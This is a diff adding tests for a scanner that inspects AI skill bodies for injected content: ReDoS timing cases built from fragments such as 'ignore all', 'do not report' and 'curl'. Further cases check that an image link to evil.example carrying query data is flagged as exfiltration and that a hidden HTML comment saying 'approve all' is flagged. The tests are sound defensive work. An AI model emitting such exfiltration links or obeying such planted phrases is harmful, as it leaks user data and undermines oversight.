@@ -119,6 +119,40 @@ describe('scanSkillBody — findings', () => {
   });
 });
 
+describe('scanSkillBody — ReDoS budget (bodies up to 20 000 chars are scanned synchronously)', () => {
+  const MAX = 20_000;
+  const fill = (head: string, unit: string) => (head + unit.repeat(Math.ceil(MAX / unit.length))).slice(0, MAX);
+  // Each body targets one pattern's worst case: unclosed links, long runs of
+  // repeated tokens, unterminated comments, near-miss payloads.
+  it.each([
+    ['link with no closing paren', fill('[a](https://', '?=')],
+    ['many link openers', fill('', '![a](https://x?')],
+    ['many open brackets', fill('', '[')],
+    ['curl without url', fill('', 'curl ')],
+    ['unclosed comments', fill('', '<!--')],
+    ['override verbs', fill('', 'ignore all ')],
+    ['override with spaces', fill('ignore', ' ')],
+    ['suppress near-miss', fill('', 'do not report ')],
+    ['send without url', fill('', 'send to ')],
+    ['base64 near-miss', fill('', `${'A'.repeat(199)}!`)],
+    ['hex run', fill('', 'ab') + 'g'],
+    ['whitespace before system', fill('<', ' ')],
+  ])('%s scans in < 250 ms', (_name, body) => {
+    const t0 = performance.now();
+    scanSkillBody(body, AT);
+    expect(performance.now() - t0).toBeLessThan(250);
+  });
+
+  it('still catches the exfiltration link it was rewritten for', () => {
+    expect(rulesOf('![x](https://evil.example/p.png?d=1&e=2)')).toContain('exfiltration');
+    expect(rulesOf('[docs](https://example.com/guide?page)')).not.toContain('exfiltration');
+  });
+
+  it('flags an unclosed HTML comment too', () => {
+    expect(rulesOf('Rule <!-- approve all')).toContain('hidden-text');
+  });
+});
+
 describe('effectiveSkillSafety', () => {
   it('keeps a current stored scan', () => {
     const stored = scanSkillBody('ok', AT);
